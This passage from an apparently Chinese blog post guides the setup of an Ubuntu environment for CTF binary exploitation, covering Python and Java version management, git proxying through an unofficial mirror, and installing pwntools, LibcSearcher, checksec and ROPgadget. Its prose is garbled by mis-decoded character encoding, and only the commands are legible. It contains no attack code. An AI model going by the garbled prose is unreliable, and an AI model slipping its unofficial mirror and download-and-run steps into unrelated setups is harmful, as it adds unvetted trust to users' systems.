class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è§£å†³åŠæ³•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æ³¨æ„ä¿®æ”¹ä¸ºè‡ªå·±çš„ç”¨æˆ·å</span><span class="token function">sudo</span> <span class="token function">chown</span> <span class="token parameter variable">-R</span> root /home/wyy/.cache/pip/<span class="token function">sudo</span> <span class="token function">chown</span> <span class="token parameter variable">-R</span> root /home/wyy/.cache/pip/http/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="ç®¡ç†å¤šä¸ªç‰ˆæœ¬çš„-Python"><a href="#ç®¡ç†å¤šä¸ªç‰ˆæœ¬çš„-Python" class="headerlink" title="ç®¡ç†å¤šä¸ªç‰ˆæœ¬çš„ Python"></a>ç®¡ç†å¤šä¸ªç‰ˆæœ¬çš„ Python</h2><blockquote><p>ä½¿ç”¨ <code>update-alternatives</code> æ¥åˆ‡æ¢ç»ˆç«¯ä¸­ <code>python</code> æŒ‡ä»¤æ‰€å¯¹åº”çš„ python ç‰ˆæœ¬</p></blockquote><p>ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--install</span> /usr/bin/python python /usr/bin/python2.7 <span class="token number">1</span><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--install</span> /usr/bin/python python /usr/bin/python3.5 <span class="token number">2</span><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--install</span> /usr/bin/python python /usr/local/python3.9/bin/python3.9 <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æœ€åæ•°å­—ä¸ºå¯¹åº” python ç‰ˆæœ¬ä¼˜å…ˆçº§ï¼Œæ•°å€¼è¶Šå¤§ï¼Œä¼˜å…ˆçº§è¶Šé«˜</p><p>å¿«é€Ÿåˆ‡æ¢ python ç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--config</span> python<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¾“å‡ºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">æœ‰ <span class="token number">3</span> ä¸ªå€™é€‰é¡¹å¯ç”¨äºæ›¿æ¢ python <span class="token punctuation">(</span>æä¾› /usr/bin/python<span class="token punctuation">)</span>ã€‚  é€‰æ‹©       è·¯å¾„                              ä¼˜å…ˆçº§  çŠ¶æ€------------------------------------------------------------* <span class="token number">0</span>            /usr/local/python3.9/bin/python3.9   <span class="token number">3</span>         è‡ªåŠ¨æ¨¡å¼  <span class="token number">1</span>            /usr/bin/python2.7                   <span class="token number">1</span>         æ‰‹åŠ¨æ¨¡å¼  <span class="token number">2</span>            /usr/bin/python3.5                   <span class="token number">2</span>         æ‰‹åŠ¨æ¨¡å¼  <span class="token number">3</span>            /usr/local/python3.9/bin/python3.9   <span class="token number">3</span>         æ‰‹åŠ¨æ¨¡å¼è¦ç»´æŒå½“å‰å€¼<span class="token punctuation">[</span>*<span class="token punctuation">]</span>è¯·æŒ‰<span class="token operator">&lt;</span>å›è½¦é”®<span class="token operator">></span>ï¼Œæˆ–è€…é”®å…¥é€‰æ‹©çš„ç¼–å·ï¼š<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€‰æ‹©éœ€è¦åˆ‡æ¢çš„ python ç‰ˆæœ¬å³å¯</p><hr><h1 id="Java-é…ç½®"><a href="#Java-é…ç½®" class="headerlink" title="Java é…ç½®"></a>Java é…ç½®</h1><blockquote><p><code>open-jdk</code> å’Œ <code>oracle-jdk</code> é€‰å…¶ä¸€å³å¯ï¼Œ<code>oracle-jdk</code> ç›¸å¯¹æ¥è¯´æ›´ç¨³å®šä¸€ç‚¹</p></blockquote><h2 id="å®‰è£…-open-jdk"><a href="#å®‰è£…-open-jdk" class="headerlink" title="å®‰è£… open-jdk"></a>å®‰è£… open-jdk</h2><p>æŸ¥æ‰¾ open-jdk ç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> search openjdk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»¥å®‰è£… open-jdk 8 ä¸ºä¾‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openjdk-8-jdk<span class="token comment"># éªŒè¯</span><span class="token function">java</span> <span class="token parameter variable">-version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥çœ‹å·²å®‰è£…çš„ open-jdk ç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> list <span class="token parameter variable">--installed</span> <span class="token operator">|</span> <span class="token function">grep</span> openjdk<span class="token comment"># æ˜¾ç¤ºï¼š</span><span class="token comment"># openjdk-11-jdk-headless/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [å·²å®‰è£…ï¼Œè‡ªåŠ¨]</span><span class="token comment"># openjdk-11-jdk/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [å·²å®‰è£…]</span><span class="token comment"># openjdk-11-jre-headless/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [å·²å®‰è£…ï¼Œè‡ªåŠ¨]</span><span class="token comment"># openjdk-11-jre/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [å·²å®‰è£…ï¼Œè‡ªåŠ¨]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¸è½½ open-jdkï¼Œä»¥ open-jdk 11 ä¸ºä¾‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jdk<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jdk-headless<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jre<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jre-headless<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥åŒæ—¶ä½¿ç”¨ apt å®‰è£…å¤šä¸ªç‰ˆæœ¬çš„ open-jdkï¼Œç„¶åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤åˆ‡æ¢ jdk ç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å¦‚æœæˆ‘ä»¬åªç”¨ apt å®‰è£…è¿‡ä¸€ä¸ªç‰ˆæœ¬çš„ javaï¼Œä¼šæ˜¾ç¤ºæ— éœ€é…ç½®</span><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--config</span> <span class="token function">java</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="å®‰è£…-oracle-jdk"><a href="#å®‰è£…-oracle-jdk" class="headerlink" title="å®‰è£… oracle-jdk"></a>å®‰è£… oracle-jdk</h2><p>å®˜ç½‘ä¸‹è½½ jdk å‹ç¼©åŒ…ï¼š<a href="https://www.oracle.com/java/technologies/downloads/">Java Downloads | Oracle</a></p><p>ä»¥ oracle-jdk 8 ä¸ºä¾‹ï¼Œä¸‹è½½ <a href="https://www.oracle.com/webapps/redirect/signon?nexturl=https://download.oracle.com/otn/java/jdk/8u381-b09/8c876547113c4e4aab3c868e9e0ec572/jdk-8u381-linux-x64.tar.gz">jdk-8u381-linux-x64.tar.gz</a></p><p>è§£å‹å¹¶ç§»åŠ¨åˆ° <code>/usr/bin</code> ç›®å½•ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> vxf jdk-8u381-linux-x64.tar.gz<span class="token function">sudo</span> <span class="token function">mv</span> jdk1.8.0_381 <span class="token function">java</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">mv</span> <span class="token function">java</span> /usr/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é…ç½®ç¯å¢ƒå˜é‡ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">JAVA_HOME</span><span class="token operator">=</span>/usr/bin/java<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token environment constant">$PATH</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">CLASSPATH</span><span class="token operator">=</span>.:<span class="token variable">$JAVA_HOME</span>/lib/dt.jar:<span class="token variable">$JAVA_HOME</span>/lib/tools.jar<span class="token comment"># éªŒè¯</span><span class="token function">java</span> <span class="token parameter variable">-version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¸è½½åªéœ€åˆ é™¤ <code>/usr/bin/java</code> ç›®å½•å³å¯</p><hr><h1 id="CTF-é…ç½®"><a href="#CTF-é…ç½®" class="headerlink" title="CTF é…ç½®"></a>CTF é…ç½®</h1><blockquote><p>å›å½’æ­£é¢˜ï¼Œå¯ä»¥å¼€å§‹å®‰è£… CTF æ‰€éœ€è¦çš„ç¯å¢ƒäº†</p></blockquote><h2 id="å®‰è£…-git"><a href="#å®‰è£…-git" class="headerlink" title="å®‰è£… git"></a>å®‰è£… git</h2><blockquote><p>è¿Ÿæ—©è¦ç”¨åˆ°çš„</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>å¦‚æœå‘ç°æœ‰æ—¶å€™ç½‘ä¸è¡Œï¼Œgithub é¡¹ç›® git ä¸ä¸‹æ¥æˆ–è€… wget ä¸ä¸‹æ¥ï¼Œæ— æ³•è¿æ¥ï¼Œå°è¯• cdn åŠ é€Ÿï¼š</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> url.<span class="token string">"https://ghproxy.com/https://github.com"</span>.insteadOf <span class="token string">"https://github.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœä¸æƒ³ä½¿ç”¨äº†ï¼Œé€šè¿‡ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--edit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ é™¤æ‰å¯¹åº”çš„é…ç½®å³å¯</p><blockquote><p><strong>æ³¨æ„ï¼šå®˜æ–¹æ˜¯æ²¡æœ‰æä¾› cdn çš„ï¼Œå› æ­¤ä¸Šé¢çš„ cdn é“¾æ¥éƒ½æ˜¯ç”¨çˆ±å‘ç”µï¼Œå¯èƒ½æŸå¤©å°±æ— æ³•ä½¿ç”¨äº†</strong></p></blockquote><ul><li>ä¹Ÿå¯ä»¥å¯¹ github.com æ·»åŠ ä»£ç†ï¼š</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> http.https://github.com.proxy socks5://127.0.0.1:7890<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœä¸æƒ³ä½¿ç”¨äº†ï¼Œé€šè¿‡ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--unset</span> http.https://github.com.proxy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å–æ¶ˆä»£ç†å³å¯</p><hr><h2 id="å®‰è£…-32-ä½åº“"><a href="#å®‰è£…-32-ä½åº“" class="headerlink" title="å®‰è£… 32 ä½åº“"></a>å®‰è£… 32 ä½åº“</h2><blockquote><p>è¿è¡Œ 32 ä½çš„ ELF å¯æ‰§è¡Œæ–‡ä»¶æ—¶éœ€è¦</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg --add-architecture i386<span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libncurses5-dev lib32z1<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libc6:i386 libstdc++6:i386<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="å®‰è£…-Capstone"><a href="#å®‰è£…-Capstone" class="headerlink" title="å®‰è£… Capstone"></a>å®‰è£… Capstone</h2><blockquote><p>ä¸€ä¸ªè½»é‡çº§çš„å¤šå¹³å°æ¶æ„æ”¯æŒçš„åæ±‡ç¼–æ¶æ„</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/aquynh/capstone /opt/capstone<span class="token builtin class-name">cd</span> /opt/capstone<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="å®‰è£…-pwntools"><a href="#å®‰è£…-pwntools" class="headerlink" title="å®‰è£… pwntools"></a>å®‰è£… pwntools</h2><blockquote><p>é€šè¿‡ pip å®‰è£…æˆ–é€šè¿‡ git å®‰è£…ï¼Œä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥ï¼Œé€‰å…¶ä¸€å³å¯</p></blockquote><ul><li>é€šè¿‡ python çš„ pip å®‰è£…</li></ul><p><strong>éœ€è¦æ³¨æ„ä½¿ç”¨å“ªä¸ªç‰ˆæœ¬çš„ python çš„ pip æ¥å®‰è£…</strong></p><p>å¦‚æœå®‰è£…äº†æ–°ç‰ˆçš„ pythonï¼Œä¾‹å¦‚ python 3.10.6ï¼Œé‚£å°±éœ€è¦å°† <code>python</code> ä¿®æ”¹ä¸ºé»˜è®¤æŒ‡å‘ python 3.10.6ï¼Œå› ä¸º Ubuntu 16.04 ä¸­ <code>python</code> é»˜è®¤æŒ‡å‘ python 2.7</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python <span class="token parameter variable">-m</span> pip <span class="token function">install</span> pwntools<span class="token comment"># æˆ–è€…ç›´æ¥å®‰è£…pwnåº“ï¼Œè‡ªå¸¦pwntools</span><span class="token function">sudo</span> python <span class="token parameter variable">-m</span> pip <span class="token function">install</span> pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ–è€…ç›´æ¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3.10 <span class="token function">install</span> pwntools<span class="token comment"># æˆ–è€…ç›´æ¥å®‰è£…pwnåº“ï¼Œè‡ªå¸¦pwntools</span>pip3.10 <span class="token function">install</span> pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æ³¨æ„ï¼š<br>å¦‚æœåšæŒä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ python 3.5 æ¥å®‰è£… pwntools çš„è¯</p><p>å› ä¸º pip é»˜è®¤ç‰ˆæœ¬åªæœ‰ 8ï¼Œæ˜¯æ— æ³•ç›´æ¥å®‰è£… pwntools çš„ï¼ŒæŠ¥é”™<br>ç›´æ¥ä½¿ç”¨ <code>pip3 install --upgrade pip</code> æ›´æ–° pip çš„è¯ï¼Œä¼šå°† pip æ›´æ–°åˆ°æœ€æ–°ç‰ˆï¼Œå¯¼è‡´ä¸ python 3.5 ä¸åŒ¹é…ï¼ŒæŠ¥é”™</p><p>è§£å†³æ–¹æ³•ï¼š<br>é¦–å…ˆä¸‹è½½ python 3.5 çš„ <code>get-pip.py</code> å¹¶è¿›è¡Œ pip æ›´æ–°<br>å¦‚æœ wget ä¸‹è½½å¤ªæ…¢ï¼Œå»ºè®®ç›´æ¥è®¿é—® <a href="https://bootstrap.pypa.io/pip/3.5/">https://bootstrap.pypa.io/pip/3.5/</a> ç”¨ç§‘å­¦ä¸Šç½‘è¿›è¡Œä¸‹è½½<br>åœ¨è¿›è¡Œ <code>python3.5 get-pip.py</code> ä¹‹å‰ï¼Œè¯·å…ˆæ›´æ¢ pip æºï¼Œå¦åˆ™ä¼šå¾ˆç—›è‹¦</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://bootstrap.pypa.io/pip/3.5/get-pip.py  python3.5 get-pip.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™æ ·ä¼šå®‰è£…å¥½ python 3.5 æ‰€æ”¯æŒçš„æœ€æ–°ç‰ˆ pipï¼špip-20.3.4</p><p>ä½†åœ¨é€šè¿‡ pip å®‰è£… pwntools æ—¶ï¼Œå¯èƒ½ä¼šæŠ¥é”™ï¼š<code>ERROR: Failed building wheel for cffi</code></p><p>è§£å†³åŠæ³•ï¼š<br>å…ˆå®‰è£… cffi æ‰€éœ€è¦çš„ä¾èµ–ï¼š<code>sudo apt install libffi-dev</code><br>ç„¶åå³å¯æ­£å¸¸å®‰è£…ï¼š<code>pip3 install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple</code></p><p><mark>å»ºè®®è¿˜æ˜¯ç›´æ¥å®‰è£… python 3.10 ä½¿ç”¨</mark></p></blockquote><ul><li>é€šè¿‡ git å®‰è£…</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/Gallopsled/pwntools /opt/pwntools<span class="token builtin class-name">cd</span> /opt/pwntools<span class="token function">sudo</span> python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºæˆ‘æ²¡ç”¨è¿™ç§æ–¹æ³•ï¼Œå¦‚æœæŠ¥é”™çš„è¯ï¼Œè¯·å‚ç…§ GDB é…ç½®ä¸€èŠ‚ä¸­å®‰è£… pwndbg çš„æ–¹æ³•ï¼Œå» <a href="https://github.com/Gallopsled/pwntools">Gallopsled&#x2F;pwntools: CTF framework and exploit development library (github.com)</a> æ‰‹åŠ¨ä¸‹è½½ä¸€ä¸ªæ—§ç‰ˆæœ¬çš„ pwntoolsï¼Œç„¶åç¼–è¯‘å®‰è£…</p><ul><li>éªŒè¯å®‰è£…</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token comment"># æ‰“å¼€python</span><span class="token comment"># è¾“å…¥ä¸‹é¢çš„ä»£ç ï¼Œâ… æˆ–â…¡é€‰å…¶ä¸€å³å¯</span>-------------------------------------------<span class="token comment"># â… </span><span class="token function">import</span> pwnpwn.asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------<span class="token comment"># â…¡</span>from pwn <span class="token function">import</span> *asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------<span class="token comment"># å¦‚æœè¾“å‡ºçš„æ˜¯è¿™ä¸ªï¼Œé‚£å°±æ˜¯å®‰è£…æˆåŠŸäº†</span>è¾“å‡ºï¼š<span class="token string">'1\xc0'</span>-------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="å®‰è£…-LibcSearcher"><a href="#å®‰è£…-LibcSearcher" class="headerlink" title="å®‰è£… LibcSearcher"></a>å®‰è£… LibcSearcher</h2><blockquote><p>åœ¨åšæ ˆæº¢å‡ºç›¸å…³çš„é¢˜æ—¶ï¼Œç»å¸¸ä¼šé‡åˆ°æ„é€  ROP é“¾çš„æƒ…å†µã€‚è‹¥æˆ‘ä»¬åœ¨ IDA åç¼–è¯‘ä¹‹åæ²¡æœ‰çœ‹åˆ° system å‡½æ•°ï¼Œæ ˆé¢˜å¤§æ¦‚ç‡éœ€è¦æ³„æ¼ libc åº“ä¸­çš„å‡½æ•°ã€‚æ­¤æ—¶ï¼ŒLibcSearcher å°±æ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œå¯ä»¥ç”¨å®ƒæ‰¾åˆ°åç§»åœ°å€</p></blockquote><p><strong>éœ€è¦æ³¨æ„ä½¿ç”¨å“ªä¸ªç‰ˆæœ¬çš„ python çš„ pip æ¥å®‰è£…</strong></p><p>å¦‚æœå®‰è£…äº†æ–°ç‰ˆçš„ pythonï¼Œä¾‹å¦‚ python 3.10.6ï¼Œé‚£å°±éœ€è¦å°† <code>python</code> ä¿®æ”¹ä¸ºé»˜è®¤æŒ‡å‘ python 3.10.6ï¼Œå› ä¸º Ubuntu 16.04 ä¸­ <code>python</code> é»˜è®¤æŒ‡å‘ python 2.7</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> LibcSearcher <span class="token parameter variable">-i</span> http://mirrors.aliyun.com/pypi/simple/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><mark>Ubuntu 16.04 çš„ pip ä½¿ç”¨æ¸…åæºå¯èƒ½ä¼šå‡ºç° SSL é”™è¯¯ï¼Œå»ºè®®ä½¿ç”¨é˜¿é‡Œæºï¼š<code>http://mirrors.aliyun.com/pypi/simple/</code></mark></p><blockquote><p><strong>æ³¨æ„</strong>ï¼š<br>ç½‘ä¸Šæœ‰å¾ˆå¤šé€šè¿‡ git æ¥å®‰è£…çš„ <code>LibcSearcher</code> åœ¨ä½¿ç”¨çš„æ—¶å€™ä¼šå‡ºç° â€œ<code>libcsearcher No matched libc, please add more libc or try others</code>â€œ çš„æŠ¥é”™ï¼Œé€šè¿‡ git å®‰è£…çš„é‚£ä¸ªç‰ˆæœ¬å¯èƒ½ä¸æ”¯æŒ python3ï¼Œæˆ–è€…ä¸æ˜¯äº‘ç«¯æŸ¥æ‰¾</p><p>æˆ‘è‡ªå·±å½“åˆå°±æ˜¯é€šè¿‡ git å®‰è£…ï¼Œç„¶åè¸©å‘äº†ï¼Œç½‘ä¸Šä¸€å¤§å †è¯´åˆ äº† <code>Libcdatabase</code> é‡æ–°ä¸‹è½½ã€é€šè¿‡ <code>./get</code> æ›´æ–°çš„æ–¹æ³•ï¼Œä½†éƒ½è¡Œä¸é€šã€‚ã€‚ã€‚</p></blockquote><hr><h2 id="å®‰è£…-checksec"><a href="#å®‰è£…-checksec" class="headerlink" title="å®‰è£… checksec"></a>å®‰è£… checksec</h2><blockquote><p>checksec å¯ç”¨äºè¯†åˆ«äºŒè¿›åˆ¶æ–‡ä»¶çš„å®‰å…¨å±æ€§ï¼Œåªæ˜¯ä¸€ä¸ª sh è„šæœ¬ï¼Œ<mark>å®‰è£… pwntools æ—¶è‡ªå¸¦ï¼Œå¦‚æœæ²¡æœ‰æˆ–è€…å‡ºç°é—®é¢˜çš„è¯å¯ä»¥å†æ‰‹åŠ¨å®‰è£…</mark></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/slimm609/checksec.sh.git /opt/checksec.sh<span class="token builtin class-name">cd</span> /opt/checksec.sh<span class="token comment"># ç›´æ¥åˆ›å»ºè½¯é“¾æ¥å³å¯ä½¿ç”¨,</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /opt/checksec.sh/checksec /usr/local/bin/checksec<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„ï¼š<em>åˆ›å»ºè½¯è¿æ¥çš„æŒ‡ä»¤ä¸­ï¼Œä¸¤ä¸ªè·¯å¾„éƒ½å¿…é¡»ä½¿ç”¨ç»å¯¹è·¯å¾„</em>ï¼Œå¦åˆ™ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ç¬¦å·è¿æ¥çš„å±‚æ•°è¿‡å¤š: checksec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœä½¿ç”¨ checksec è¿‡ç¨‹ä¸­å‡ºç°å¦‚ä¸‹æŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> not found: checksec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯å°è¯•ä½¿ç”¨ä¸Šè¿°æ–¹æ³•é€šè¿‡ git ä»“åº“åˆ›å»ºè½¯é“¾æ¥è¿›è¡Œä¿®å¤</p><p>å½“ç„¶è¿˜å¯ä»¥ç›´æ¥é‡è£… pwntoolsï¼Œå› ä¸º checksec ä¸€èˆ¬æ˜¯å®‰è£… pwntools è‡ªå¸¦çš„ï¼ŒæŠ¥é”™å¤§æ¦‚ç‡ä¸ pwntools æœ‰å…³ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip uninstall pwntoolspip <span class="token function">install</span> pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="å®‰è£…-ROPgadget"><a href="#å®‰è£…-ROPgadget" class="headerlink" title="å®‰è£… ROPgadget"></a>å®‰è£… ROPgadget</h2><blockquote><p>ç”¨æ¥æ‰¾ gadget çš„ï¼Œ<mark>è¿™ä¸ªå®‰è£… pwntools æ—¶è‡ªå¸¦ï¼Œå¦‚æœæ²¡æœ‰çš„è¯å¯ä»¥å†æ‰‹åŠ¨å®‰è£…</mark></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/JonathanSalwan/ROPgadget.git /opt/ROPgadget<span class="token builtin class-name">cd</span> /opt/ROPgadget<span class="token function">sudo</span> python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœä½¿ç”¨ ROPgadget è¿‡ç¨‹ä¸­å‡ºç°å¦‚ä¸‹æŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:  File <span class="token string">"/usr/local/bin/ROPgadget"</span>, line <span class="token number">4</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    __import__<span class="token punctuation">(</span><span class="token string">'pkg_resources'</span><span class="token punctuation">)</span>.run_script<span class="token punctuation">(</span><span class="token string">'ROPGadget==7.3'</span>, <span class="token string">'ROPgadget'</span><span class="token punctuation">)</span>  File <span class="token string">"/home/wyy/.local/lib/python3.10/site-packages/pkg_resources/__init__.py"</span>, line <span class="token number">720</span>, <span class="token keyword">in</span> run_script    self.require<span class="token punctuation">(</span>requires<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.run_script<span class="token punctuation">(</span>script_name, ns<span class="token punctuation">)</span>  File <span class="token string">"/home/wyy/.local/lib/python3.10/site-packages/pkg_resources/__init__.py"</span>, line <span class="token number">1546</span>, <span class="token keyword">in</span> run_script    raise ResolutionError<span class="token punctuation">(</span>pkg_resources.ResolutionError: Script <span class="token string">'scripts/ROPgadget'</span> not found <span class="token keyword">in</span> metadata at <span class="token string">'/home/wyy/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ— è®ºæ˜¯ pwntools è‡ªå¸¦çš„ ROPgadget è¿˜æ˜¯è‡ªå·±æ‰‹åŠ¨ git å®‰è£…çš„ ROPgadgetï¼Œéƒ½å°† ROPgadget çš„ git ä»“åº“ä¸‹çš„ <code>scripts</code> ç›®å½•ç§»åŠ¨åˆ°<strong>æŠ¥é”™çš„è·¯å¾„</strong>ä¸‹å³å¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å¦‚æœæ˜¯ pwntools è‡ªå¸¦çš„ ROPgadget, é¦–å…ˆéœ€è¦å°† ROPgadget ä»“åº“ git åˆ°æœ¬åœ°</span><span class="token comment"># sudo git clone https://github.com/JonathanSalwan/ROPgadget.git /opt/ROPgadget</span><span class="token builtin class-name">cd</span> /opt/ROPgadget<span class="token function">sudo</span> <span class="token function">cp</span> <span class="token parameter variable">-r</span> scripts /home/wyy/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹Ÿå¯ä»¥å°è¯•æŸ¥çœ‹ ROPgadget çš„ç‰ˆæœ¬ï¼Œå¹¶å¸è½½é‡è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip list <span class="token operator">|</span> <span class="token function">grep</span> ROPgadgetpip uninstall 